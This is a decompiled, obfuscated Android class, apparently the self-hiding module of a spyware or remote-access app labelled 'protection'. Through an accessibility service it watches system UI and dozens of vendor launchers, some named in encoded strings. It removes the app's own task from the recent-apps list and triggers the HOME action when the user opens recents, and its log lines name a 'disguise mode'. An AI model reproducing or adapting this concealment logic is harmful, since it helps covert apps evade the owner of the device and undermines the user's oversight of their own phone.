package com.storm.safe.rock.service.modules.protection;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import java.util.Iterator;
import java.util.List;
import java.util.Set;
import kotlin.AbstractC0767a0;
import p000.AbstractC0134bh;
import p000.RunnableC1052p1;
import p000.fb1;
import p000.rk1;
import p000.t60;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.protection.a1 */
/* loaded from: classes2.dex */
public final class C0356a1 {

    /* renamed from: b2 */
    public static final rk1 f53714b2 = new rk1(null);

    /* renamed from: b3 */
    public static volatile C0356a1 f53715b3;

    /* renamed from: b4 */
    public static volatile boolean f53716b4;

    /* renamed from: a0 */
    public final dqtvuisjd f53717a0;

    /* renamed from: a1 */
    public final dqtvuisjd f53718a1;

    /* renamed from: a2 */
    public volatile boolean f53719a2;

    /* renamed from: a3 */
    public volatile boolean f53720a3;

    /* renamed from: a4 */
    public volatile long f53721a4;

    /* renamed from: a5 */
    public final y90 f53722a5 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.npweufstehlb$ourPackageName$2
        {
            super(0);
        }

        @Override // p000.w00
        public final Object invoke() {
            return this.f53736a0.f53717a0.getPackageName();
        }
    });

    /* renamed from: a6 */
    public w00 f53723a6;

    /* renamed from: a7 */
    public w00 f53724a7;

    /* renamed from: a8 */
    public w00 f53725a8;

    /* renamed from: a9 */
    public final HandlerThread f53726a9;

    /* renamed from: b0 */
    public final Handler f53727b0;

    /* renamed from: b1 */
    public final Set f53728b1;

    public C0356a1(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        this.f53717a0 = dqtvuisjdVar;
        this.f53718a1 = dqtvuisjdVar2;
        HandlerThread handlerThread = new HandlerThread("RecentsGuardBg");
        handlerThread.start();
        this.f53726a9 = handlerThread;
        this.f53727b0 = new Handler(handlerThread.getLooper());
        this.f53728b1 = AbstractC0134bh.m210734f7(new String[]{"com.android.systemui", "com.huawei.android.launcher", "com.huawei.home", "com.hihonor.android.launcher", "com.hihonor.home", "com.miui.home", StringUtil.m212470a0("KFYcdEIoHCEZPSpMHzlFPR4="), "com.oplus.launcher", "com.coloros.launcher", "com.realme.launcher", "com.oneplus.launcher", "net.oneplus.launcher", "com.bbk.launcher2", StringUtil.m212470a0("KFYcdE86B2BbMD5XEjJIKg=="), StringUtil.m212470a0("KFYcdFsxGiEZPSpMHzlFPR4="), "com.vivo.launcher.two", StringUtil.m212470a0("KFYcdEQpAyEZPSpMHzlFPR4="), "com.iqoo.launcher.two", "com.samsung.android.launcher", "com.sec.android.app.launcher", "com.android.launcher", "com.android.launcher2", "com.android.launcher3", "com.google.android.apps.nexuslauncher", "com.meizu.flyme.launcher", "com.meizu.launcher", "com.meizu.launcher3", "com.motorola.launcher3", "com.motorola.launcher", "com.lge.launcher2", "com.lge.launcher3", "com.nothing.launcher", "com.asus.launcher", "com.asus.zenui.launcher", "com.zte.mifavor.launcher", "cn.nubia.launcher", "com.lenovo.launcher", "com.lenovo.launcher2", "com.transsion.launcher", "com.infinix.launcher", "com.tecno.launcher", "com.itel.launcher", "com.evenwell.launcher", "com.nokia.launcher", "com.sonymobile.home", "com.sony.home", "com.sonyericsson.home", "com.smartisanos.launcher", "com.yulong.android.launcher", "com.gionee.launcher"});
        f53715b3 = this;
    }

    /* renamed from: a3 */
    public static boolean m211952a3(AccessibilityNodeInfo accessibilityNodeInfo) {
        Iterator it = fb1.f56194a0.iterator();
        while (it.hasNext()) {
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((String) it.next());
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty() && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it2.hasNext()) {
                        if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                            Iterator<T> it3 = listFindAccessibilityNodeInfosByViewId.iterator();
                            while (it3.hasNext()) {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            }
                            return true;
                        }
                    }
                }
                if (listFindAccessibilityNodeInfosByViewId != null) {
                    Iterator<T> it4 = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it4.hasNext()) {
                        ((AccessibilityNodeInfo) it4.next()).recycle();
                    }
                }
            } catch (Exception unused) {
            }
        }
        return false;
    }

    /* renamed from: a0 */
    public final void m211953a0() {
        ComponentName componentName;
        try {
            Object systemService = this.f53717a0.getSystemService("activity");
            ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
            if (activityManager == null) {
                return;
            }
            for (ActivityManager.AppTask appTask : activityManager.getAppTasks()) {
                ActivityManager.RecentTaskInfo taskInfo = appTask.getTaskInfo();
                if (taskInfo != null && (componentName = taskInfo.baseActivity) != null) {
                    String packageName = componentName.getPackageName();
                    Object value = this.f53722a5.getValue();
                    t60.m214694b5(value, "<get-ourPackageName>(...)");
                    if (t60.m214686a2(packageName, (String) value)) {
                        appTask.setExcludeFromRecents(true);
                        return;
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: a1 */
    public final void m211954a1() {
        this.f53720a3 = false;
        this.f53727b0.removeCallbacksAndMessages(null);
        try {
            w00 w00Var = this.f53725a8;
            if (w00Var != null) {
                if (((Boolean) w00Var.invoke()).booleanValue()) {
                    t60.m214714d6("npweufstehlb", "🎭 伪装模式: 仅 excludeFromRecents, 跳过 HOME");
                    return;
                }
            }
        } catch (Exception unused) {
        }
        f53716b4 = true;
        this.f53718a1.performGlobalAction(2);
        t60.m214714d6("npweufstehlb", "🎭 HOME已执行, appOpenedFlag=false");
    }

    /* renamed from: a2 */
    public final void m211955a2() {
        if (this.f53719a2) {
            return;
        }
        this.f53719a2 = true;
        m211953a0();
        t60.m214714d6("npweufstehlb", "✅ 最近任务隐藏已启用");
    }

    /* renamed from: a4 */
    public final void m211956a4(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        String string;
        if (!this.f53719a2 || (packageName = accessibilityEvent.getPackageName()) == null || (string = packageName.toString()) == null) {
            return;
        }
        Object value = this.f53722a5.getValue();
        t60.m214694b5(value, "<get-ourPackageName>(...)");
        if (string.equals((String) value)) {
            return;
        }
        int eventType = accessibilityEvent.getEventType();
        if ((eventType == 32 || eventType == 2048) && this.f53728b1.contains(string)) {
            w00 w00Var = this.f53723a6;
            if (w00Var == null || !((Boolean) w00Var.invoke()).booleanValue()) {
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (jCurrentTimeMillis - this.f53721a4 < 2000) {
                    return;
                }
                this.f53721a4 = jCurrentTimeMillis;
                this.f53727b0.removeCallbacksAndMessages(null);
                this.f53727b0.postDelayed(new RunnableC1052p1(this, 22, string), eventType == 32 ? 150L : 250L);
            }
        }
    }
}
